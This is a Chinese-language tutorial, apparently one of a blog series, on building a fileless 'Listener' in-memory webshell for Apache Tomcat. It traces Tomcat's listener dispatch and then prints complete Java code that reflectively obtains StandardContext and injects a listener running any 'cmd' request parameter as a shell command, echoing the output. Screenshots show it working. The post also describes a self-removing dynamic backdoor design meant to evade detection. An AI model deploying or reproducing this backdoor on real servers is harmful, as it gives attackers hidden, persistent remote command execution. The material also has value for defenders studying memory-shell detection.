## 写在前面

继前面的`Filter``Servlet`内存马技术，这是系列文章的第三篇了，这篇将给大家带来的是`Listener`内存马技术。

## 前置

### 什么是Listener？

监听器 Listener 是一个实现特定接口的 Java 程序，这个程序专门用于监听另一个 Java
对象的方法调用或属性改变，当被监听对象发生上述事件后，监听器某个方法将立即自动执行。

监听器的相关概念：

> 事件：方法调用、属性改变、状态改变等。
>
> 事件源：被监听的对象（ 例如：request、session、servletContext）。
>
> 监听器：用于监听事件源对象 ，事件源对象状态的变化都会触发监听器。
>
> 注册监听器：将监听器与事件源进行绑定

监听器 Listener 按照监听的事件划分，可以分为 3 类：

> 监听对象创建和销毁的监听器
>
> 监听对象中属性变更的监听器
>
> 监听 HttpSession 中的对象状态改变的监听器

### Listener的简单案例

在Tomcat中创建Listener有两种方式：

> 使用web.xml中的`listener`标签创建
>
> 使用`@WebListener`注册监听器

我们创建一个实现了`javax.servlet.ServletRequestListener`接口的类。

    
    
    package pres.test.momenshell;
    
    import javax.servlet.ServletRequestEvent;
    import javax.servlet.ServletRequestListener;
    
    public class ListenerTest implements ServletRequestListener {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
            System.out.println("destroy Listener!");
        }
    
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            System.out.println("initial Listener!");
        }
    }
    

将会在请求开始和请求结束分别执行`requestInitialized`或者`requestDestroyed`方法中的逻辑，

之后再`web.xml`中配置Listener。

    
    
    <listener>
        <listener-class>pres.test.momenshell.ListenerTest</listener-class>
    </listener>
    

之后开启tomcat容器。![image-20220911141917981.png](https://image.3001.net/images/20220911/1662895568_631dc5d06a2a09863b3cb.png!small)

在请求前和请求后都会执行对应逻辑。

### Listener流程分析

首先给出程序到`requestInitialized`方法之前的调用栈。

    
    
    requestInitialized:14, ListenerTest (pres.test.momenshell)
    fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)
    invoke:121, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
    invoke:78, StandardEngineValve (org.apache.catalina.core)
    service:364, CoyoteAdapter (org.apache.catalina.connector)
    service:624, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
    run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

将会到达`StandardHostValve#invoke`方法。

![image-20220911142229473.png](https://image.3001.net/images/20220911/1662895578_631dc5da31467bebcee44.png!small)

调用了`StandardContext#fireRequestInitEvent`方法进行请求初始化。

![image-20220911142312811.png](https://image.3001.net/images/20220911/1662895587_631dc5e350ffd3e62cf28.png!small)

在其中，程序通过扫描web.xml中得到了对应的实例化对象，因为我们在web.xml中做出了对应的配置，所以我们能够通过`if (instance !=
null && instance instanceof
ServletRequestListener)`的判断，进而调用了listener的`requestInitialized`方法。

即为我们的`ListenerTest#requestInitialized`方法。

![image-20220911142624155.png](https://image.3001.net/images/20220911/1662895597_631dc5ed70c4f2b9a8536.png!small)

## 正文

有了上面的相关基础，更能加深对内存马的理解。

### 分析注入

同样在`javax.servlet.ServletContext`中对于`addListener`有三种重载方式。

![image-20220911144601869.png](https://image.3001.net/images/20220911/1662895606_631dc5f6cee8b3131b827.png!small)

![image-20220911144652343.png](https://image.3001.net/images/20220911/1662895613_631dc5fd6e55654a77b2e.png!small)

跟进api中的注解

能够实现的的监听器有：

> ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
>
> ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
>
> ServletRequestListener：对 Request 请求进行监听（创建、销毁）
>
> ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
>
> javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
>
> javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听

每一种 接口有着不同的方法存在，就比如`ServletRequestListener`这个监听器。

![image-20220911151430482.png](https://image.3001.net/images/20220911/1662895623_631dc6070f48dedc362a1.png!small)

存在有`requestDestroyed`和`requestInitialized`方法进行请求前和请求后的监听，又或者是`ServletRequestAttributeListener`这个监听器。

![image-20220911151555376.png](https://image.3001.net/images/20220911/1662895629_631dc60da6b84c4c8f895.png!small)

存在有`attributeAdded``attributeRemoved``attributeReplaced`分别对属性增 / 属性删 /
属性替换做出了监听。

但是这些监听器都是继承同一个接口`EventListener`，我们可以跟进一下`addListener`在Tomcat中的实现

在`org.apache.catalina.core.ApplicationContext#addListener`中。

![image-20220911152543082.png](https://image.3001.net/images/20220911/1662895636_631dc614c395a4fcb3175.png!small)

如果这里传入的是一个ClassName，将会将其进行实例化之后判断是否实现了`EventListener`接口，也就是是否在监听类中实现了特性的监听器。

如果实现了这个标志接口将会将其强转为`EventListener`并传入`addListener`的重载方法。

![image-20220911152918128.png](https://image.3001.net/images/20220911/1662895644_631dc61c15f43e3a603f8.png!small)

同样和前面类似，不能在程序运行过程中进行Listener的添加，并且如果的监听器是`ServletContextAttributeListener
ServletRequestListener ServletRequestAttributeListener HttpSessionIdListener
HttpSessionAttributeListener`的时候将会通过调用`StardardContext#addApplicationEventListener`添加监听器，

又如果是`HttpSessionListener
ServletContextListener`将会调用`addApplicationLifecycleListener`方法进行监听器的添加，

通过上面的分析我们不难得到Listener内存马中关于`ServletRequestListener `这个监听器的实现步骤：

> 首先获取到`StardardContext`对象
>
> 之后创建一个实现了`ServletRequestListener `接口的监听器类
>
> 再然后通过调用`StardardContext`类的`addApplicationEventListener`方法进行Listener的添加

### 实现内存马

有了上面的步骤我们就能够构造内存马

首先通过循环的方式获取`StandardContext`对象。

    
    
    ServletContext servletContext = req.getServletContext();
    StandardContext o = null;
    while (o == null) { //循环从servletContext中取出StandardContext
        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        Object o1 = field.get(servletContext);
    
        if (o1 instanceof ServletContext) {
            servletContext = (ServletContext) o1;
        } else if (o1 instanceof StandardContext) {
            o = (StandardContext) o1;
        }
    }
    

之后创建一个监听器类, 我这里同样是一段任意代码执行的构造，通过reponse写进行回显操作。

    
    
    class Mylistener implements ServletRequestListener {
    
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
            ServletRequest request = servletRequestEvent.getServletRequest();
            if (request.getParameter("cmd") != null) {
                try {
                    String cmd = request.getParameter("cmd");
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(inputStream).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    Field request1 = request.getClass().getDeclaredField("request");
                    request1.setAccessible(true);
                    Request request2 = (Request) request1.get(request);
                    request2.getResponse().getWriter().write(output);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchFieldException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }
        }
    
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    
        }
    }
    

最后当然就是将Listen添加。

    
    
    Mylistener mylistener = new Mylistener();
    //添加listener
    o.addApplicationEventListener(mylistener);
    

得到完整的内存马。

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.core.StandardContext;
    
    import javax.servlet.*;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.InputStream;
    import java.lang.reflect.Field;
    import java.util.Scanner;
    
    public class AddTomcatListener extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                ServletContext servletContext = req.getServletContext();
                StandardContext o = null;
                while (o == null) { //循环从servletContext中取出StandardContext
                    Field field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object o1 = field.get(servletContext);
    
                    if (o1 instanceof ServletContext) {
                        servletContext = (ServletContext) o1;
                    } else if (o1 instanceof StandardContext) {
                        o = (StandardContext) o1;
                    }
                }
                Mylistener mylistener = new Mylistener();
                //添加listener
                o.addApplicationEventListener(mylistener);
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }
    class Mylistener implements ServletRequestListener {
    
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
            ServletRequest request = servletRequestEvent.getServletRequest();
            if (request.getParameter("cmd") != null) {
                try {
                    String cmd = request.getParameter("cmd");
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(inputStream).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    Field request1 = request.getClass().getDeclaredField("request");
                    request1.setAccessible(true);
                    Request request2 = (Request) request1.get(request);
                    request2.getResponse().getWriter().write(output);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchFieldException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }
        }
    
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    
        }
    }
    

### 内存马实验

这里同样使用在系列文章第一篇中提到的`IndexServlet`进行实验。

    
    
    public class IndexServlet extends HttpServlet {
    
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String message = "Tomcat project!";
            String id = req.getParameter("id");
    
            StringBuilder sb = new StringBuilder();
            sb.append(message);
            if (id != null && id != null) {
                sb.append("\nid: ").append(id); //拼接id
            }
            resp.getWriter().println(sb);
        }
    }
    

将会对传入参数id进行回显

之后配置`addTomcatListener`路由的Servlet进行内存马的注入。

这是最开始进行访问的情况。

![image-20220911155333338.png](https://image.3001.net/images/20220911/1662895663_631dc62f776c9219dbf65.png!small)

访问`addTomcatListener`路由进行内存马的注入。

![image-20220911155411510.png](https://image.3001.net/images/20220911/1662895671_631dc637d553388bd85d0.png!small)

再次访问`/index`并传入cmd参数。

![image-20220911155459240.png](https://image.3001.net/images/20220911/1662895677_631dc63dd4a7a10f35c8e.png!small)

发现不仅仅回显了我传入的id参数，同样进行了命令的执行。

### 其他的花样构造

在api中支持的监听器中，还有很多其他的监听器可以进行内存马的实现，这里仅仅是对其中一个比较方法的监听器进行了说明。

比如说`ServletRequestAttributeListener`这个监听器，在分析注入那里也有所提及，我们通要可以将我们的恶意代码插入在

![image-20220911160206439.png](https://image.3001.net/images/20220911/1662895684_631dc644be5ab984b2bf1.png!small)

这些方法中进行对应的操作进行内存马的触发。

根据su18提供的一种攻击思路。

> 由于在 ServletRequestListener 中可以获取到
> ServletRequestEvent，这其中又存了很多东西，ServletContext/StandardContext
> 都可以获取到，那玩法就变得更多了。可以根据不同思路实现很多非常神奇的功能，我举个例子：
>
>   * 在 requestInitialized 中监听，如果访问到了某个特定的 URL，或这次请求中包含某些特征（可以拿到 request
> 对象，随便怎么定义），则新起一个线程去 StandardContext 中注册一个 Filter，可以实现某些恶意功能。
>
>   * 在 requestDestroyed 中再起一个新线程 sleep 一定时间后将我们添加的 Filter 卸载掉。
>
>

>
> 这样我们就有了一个真正的动态后门，只有用的时候才回去注册它，用完就删

## 总结

也在这里总结一下这三种的执行顺序和特性。

他们的执行顺序分别是Listener > Filter > Servlet

> Servlet ：在用户请求路径与处理类映射之处，添加一个指定路径的指定处理类；
>
> Filter：在用户处理类之前的，用来对请求进行额外处理提供额外功能的类；
>
> Listener：在 Filter 之外的监听进程。

总的来说Listener内存马比前两篇的危害更大，更具有隐藏性，且能够有更多的构造方式

最后，贴一下我总结的内存马编写流程

  1. 首先获取到`StardardContext`对象

  2. 之后创建一个实现了`ServletRequestListener `接口的监听器类

  3. 再然后通过调用`StardardContext`类的`addApplicationEventListener`方法进行Listener的添加

## Ref

https://su18.org/post/memory-shell

